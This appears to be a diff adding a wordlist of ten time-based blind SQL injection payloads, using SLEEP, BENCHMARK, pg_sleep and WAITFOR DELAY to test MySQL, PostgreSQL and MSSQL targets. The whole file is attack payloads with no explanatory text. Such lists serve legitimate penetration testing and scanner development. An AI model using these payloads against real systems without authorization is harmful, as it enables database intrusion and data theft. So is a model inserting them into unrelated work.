@@ -1,0 +1,10 @@
+' OR BENCHMARK(5000000,MD5(1)) -- 
+' OR IF(1=1,SLEEP(5),0) -- 
+' OR IF(1=2,0,SLEEP(5)) -- 
+' OR IF(2>1,SLEEP(5),0) -- 
+' OR SLEEP(5) -- 
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END -- 
+'; SELECT IF(1=1, pg_sleep(5), pg_sleep(0)) -- 
+'; SELECT pg_sleep(5) -- 
+'; SELECT pg_sleep(5)-- 
+'; WAITFOR DELAY '00:00:05' -- 
